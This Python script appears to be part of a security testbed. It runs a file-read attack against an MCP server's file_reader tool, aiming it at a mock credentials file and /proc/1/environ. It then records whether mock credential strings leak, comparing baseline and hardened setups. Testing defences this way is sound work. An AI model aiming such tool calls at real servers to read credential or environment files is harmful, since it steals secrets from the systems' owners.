#!/usr/bin/env python3
"""
Purpose: Scenario A — Path traversal / file-read credential exfiltration.
         Invokes the file_reader MCP tool with two paths per run:
           1. /mnt/data/config/credentials.env  (mock credentials store)
           2. /proc/1/environ                    (root process environment)
         Records whether mock credential strings appear in the response.
         Baseline: both paths succeed and expose credentials (M1 SUCCESS).
         Hardened: both paths are rejected by path allowlist (M1 FAILED).
Component: 3 — Attack Scenarios and Timing
Metrics:   M1 (attack success rate), M2 (scope of compromise), M3 (detection)
"""

import argparse
import asyncio
import json
import os
import sys
import time
from datetime import datetime, timezone

from mcp.client.session import ClientSession
from mcp.client.sse import sse_client

# ---------------------------------------------------------------------------
# Mock credential strings — pattern-matched in tool responses
# ---------------------------------------------------------------------------
CREDENTIAL_PATTERNS = [
    ("AWS_ACCESS_KEY_ID",     "AKIAIOSFODNN7EXAMPLE",       "High"),
    ("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI/K7MDENG",      "High"),
    ("DB_CONNECTION_STRING",  "FAKEPASSWORD123",             "High"),
    ("INTERNAL_API_TOKEN",    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MOCK", "Medium"),
]

TARGET_PATHS = [
    "/mnt/data/config/credentials.env",
    "/proc/1/environ",
]


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Scenario A — File-read credential exfiltration")
    parser.add_argument("--target-ip",    required=True,  help="ECS task IP address")
    parser.add_argument("--port",         type=int, default=8080)
    parser.add_argument("--architecture", choices=["baseline", "hardened"], default="baseline")
    return parser.parse_args()


async def _call_file_reader(sse_url: str, path: str) -> tuple[str | None, str | None]:
    """
    Call file_reader tool. Returns (content, error_message).
    content is None on error; error_message is None on success.
    """
    try:
        async with asyncio.timeout(35):
            async with sse_client(sse_url) as (read, write):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    result = await session.call_tool("file_reader", {"path": path})
                    if result.isError:
                        err = result.content[0].text if result.content else "tool error"
                        return None, err
                    text = "\n".join(
                        b.text for b in result.content if hasattr(b, "text")
                    )
                    return text, None
    except asyncio.TimeoutError:
        return None, "timeout: server did not respond within 35s"
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _scan_for_credentials(text: str) -> list[dict]:
    """Return list of credential items found in text."""
    found = []
    for name, pattern, tier in CREDENTIAL_PATTERNS:
        if pattern in text:
            found.append({"item": name, "sensitivity_tier": tier})
    return found


def main() -> None:
    args = _parse_args()
    sse_url = f"http://{args.target_ip}:{args.port}/sse"
    out_dir = os.path.join("results", args.architecture)
    os.makedirs(out_dir, exist_ok=True)

    timestamp_start = datetime.now(timezone.utc).isoformat()
    runs = []

    for run_num in range(1, 4):
        print(f"\n[Scenario A] Run {run_num}/3 — architecture={args.architecture}")
        run_start = datetime.now(timezone.utc).isoformat()
        combined_text = ""
        outcome = "FAILED"
        detail_parts = []
        m2_items: list[dict] = []

        for path in TARGET_PATHS:
            print(f"  → file_reader(path={path!r})")
            content, error = asyncio.run(_call_file_reader(sse_url, path))

            if error:
                detail_parts.append(f"path={path!r}: REJECTED/ERROR — {error}")
                print(f"    ✗ {error}")
            else:
                combined_text += content or ""
                found = _scan_for_credentials(content or "")
                detail_parts.append(
                    f"path={path!r}: SUCCESS — "
                    f"{len(found)} credential item(s) found"
                )
                print(f"    ✓ {len(content or '')} bytes; {len(found)} credential item(s)")
                for item in found:
                    if item not in m2_items:
                        m2_items.append(item)

        # M1: SUCCESS if credentials.env path returned at least one credential string
        cred_env_content, cred_env_err = asyncio.run(
            _call_file_reader(sse_url, TARGET_PATHS[0])
        ) if not combined_text else (combined_text, None)

        primary_creds = _scan_for_credentials(combined_text)
        if primary_creds:
            outcome = "SUCCESS"
        elif any("REJECTED" in d or "Access denied" in d for d in detail_parts):
            outcome = "FAILED"
        else:
            outcome = "ERROR"

        run_end = datetime.now(timezone.utc).isoformat()
        runs.append({
            "run_number":       run_num,
            "run_start_time":   run_start,
            "run_end_time":     run_end,
            "outcome":          outcome,
            "m2_items_accessed": m2_items,
            "detail":           " | ".join(detail_parts),
        })
        print(f"  → Run {run_num} outcome: {outcome}")

        if run_num < 3:
            print("  Sleeping 5s before next run...")
            time.sleep(5)

    timestamp_end = datetime.now(timezone.utc).isoformat()
    success_count = sum(1 for r in runs if r["outcome"] == "SUCCESS")
    m1_pct = round(success_count / len(runs) * 100, 1)

    result = {
        "scenario":                  "A",
        "architecture":              args.architecture,
        "timestamp_start":           timestamp_start,
        "timestamp_end":             timestamp_end,
        "runs":                      runs,
        "m1_success_rate_pct":       m1_pct,
        "m3_log_events_generated":   None,
    }

    out_path = os.path.join(out_dir, "scenario_a_results.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)

    print(f"\n[Scenario A] Complete. M1={m1_pct}% | Results → {out_path}")


if __name__ == "__main__":
    main()
